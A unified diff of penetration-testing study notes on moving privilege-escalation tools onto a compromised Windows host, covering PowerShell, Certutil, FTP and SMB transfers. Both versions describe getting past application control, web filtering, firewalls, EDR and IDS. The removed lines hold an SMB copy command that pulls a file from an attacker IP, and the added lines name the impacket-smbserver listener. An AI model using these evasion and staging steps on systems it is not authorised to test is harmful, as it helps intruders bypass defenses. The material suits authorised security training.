@@ -1,58 +1,43 @@
-### File Transfer Evasion and Methodology
-
-File transfers are a critical component of post-exploitation, used to move enumeration scripts or privilege escalation binaries between the attack machine and the target. Successful transfers require navigating both host-level protections and network-level restrictions.
-
-#### Factors Affecting Transfer Success
-
-Before attempting a transfer, evaluate the environment for potential blockers:
-
-|Control Type|Mechanism|Impact on File Transfer|
-|:--|:--|:--|
-|**Host Controls**|**Application Control Policy** / **Whitelisting**|Prevents the execution of common transfer tools like PowerShell.|
-|**Host Controls**|**AV/EDR**|May block specific application activities or flag transferred binaries as malicious.|
-|**Network Controls**|**Firewalls**|Blocks outbound traffic on specific ports (e.g., TCP 21).|
-|**Network Controls**|**Web Content Filtering**|Prevents access to external sites used for hosting tools (GitHub, Dropbox, Google Drive).|
-|**Network Controls**|**IDS / IPS**|Monitors and alerts on uncommon operations or signatures within the traffic.|
+1. Evaluate if **Application Control Policy** blocks PowerShell execution.
+2. Check for **web content filtering** preventing access to external repos like GitHub or cloud storage.
+3. Test for **network firewall** egress blocks on Port 21.
+4. Verify if **TCP Port 445** is open for outbound SMB connections.
 
 ---
 
-#### Methodology: Selecting a Transfer Technique
+## PowerShell Transfer
 
-Follow this workflow when initial methods are blocked by security controls.
+When script execution is required for enumeration but may be restricted by **Application Control Policy**.
 
-1. **Identify the Goal:** Determine if you need to move a script (e.g., `PowerUp.ps1`) for enumeration or a compiled binary (e.g., `PrintSpoofer`) for escalation.
-2. **Test Native Binaries:** Attempt to use built-in OS tools first, as they are part of core functionality.
-    - **PowerShell:** Use for script execution and transfers unless blocked by **Application Control Policy**.
-    - **Certutil:** Use to download files directly from external URLs if **Web Content Filtering** is not present.
-3. **Evaluate Outbound Ports:** If native web-based downloads fail, test common protocols and ports.
-    - Check if **Port 21 (FTP)** is allowed through the network firewall.
-    - Check if **Port 445 (SMB)** is open for outbound traffic.
-4. **Execute Transfer:** Use the identified open pathway to move the necessary tools to the target.
+> ⚠️ Gap: Source does not provide PowerShell transfer syntax.
 
----
+- **Application Control Policy** will prevent the script from running or transferring.
 
-#### Command Reference & Scenario Context
+## Certutil Transfer
 
-|Technique|Scenario / Context|Result in Provided Source|
-|:--|:--|:--|
-|**PowerShell**|Standard transfer for scripts (e.g., `PowerUp.ps1`).|**Failed:** Blocked by Application Control Policy.|
-|**Certutil**|Downloading compiled binaries from public repos (e.g., GitHub).|**Failed:** Blocked by Web Content Filtering.|
-|**FTP Client**|Outbound file transfer via standard protocol.|**Failed:** Port 21 (TCP) blocked by network firewall.|
-|**SMB (Impacket)**|Use when outbound Port 445 is permitted.|**Success:** Allowed successful binary copy.|
+When PowerShell is restricted and the environment allows outbound web traffic to external sites.
 
-**Operational Steps for SMB Transfer:** _When other outbound ports (21, 80, 443) are restricted, SMB may remain open to facilitate internal networking._
+> ⚠️ Gap: Source does not provide Certutil command flags.
 
-1. Set up the SMB server on the attack machine to share a local folder.
-2. Connect to the share from the target machine and copy the required binary.
+- **Web content filtering** frequently blocks GitHub, Dropbox, and Google Drive.
+
+## FTP Transfer
+
+When web-based transfer methods are filtered and the firewall allows Port 21 egress.
+
+> ⚠️ Gap: Source does not provide Windows FTP client commands.
+
+- **Network firewalls** commonly block outbound traffic on Port 21.
+
+## SMB Transfer
+
+When other outbound ports are restricted but **TCP Port 445** is open to the attack redirector.
+
+Tool for setting up the listener on `<ATTACK_IP>`
 
 ```
-# Example of using SMB to move a file to the target
-copy \\<ATTACK_IP>\<SHARE_NAME>\<FILENAME> .
+impacket-smbserver
 ```
 
----
-
-#### Decision Points
-
-- **Use SMB** when you have confirmed that outgoing traffic to **TCP port 445** is allowed while other ports like **21** are blocked.
-- **Avoid External Repositories** if the organization has **strong web content filtering**; instead, host the files on a controlled `<ATTACK_IP>`.
+- **AV/EDR** or **host controls** may block the transfer of known malicious binaries or specific SMB operations.
+- **IDS/IPS** systems can monitor and alert on uncommon SMB operations between internal hosts and external IPs.
